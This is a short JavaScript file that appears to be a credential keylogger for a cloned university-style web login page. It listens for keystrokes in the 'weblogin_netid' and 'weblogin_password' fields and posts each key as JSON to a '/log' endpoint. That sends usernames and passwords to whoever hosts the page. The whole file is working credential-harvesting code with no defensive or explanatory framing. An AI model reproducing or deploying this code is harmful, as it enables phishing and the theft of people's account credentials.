
const netid = document.getElementById("weblogin_netid");
const netpass = document.getElementById("weblogin_password");

let output = ''
netid.addEventListener("keydown", function(event){
    console.log(event);
    output = event.key

    const outcome = {netid: output}
    fetch("/log", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(
            outcome
        )
    })  
})


netpass.addEventListener("keydown", function(event){
    console.log(event);
    pass = event.key

    const outcome = {netPass: pass} 

    fetch("/log", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(
            outcome
        )
    }) 
    
})

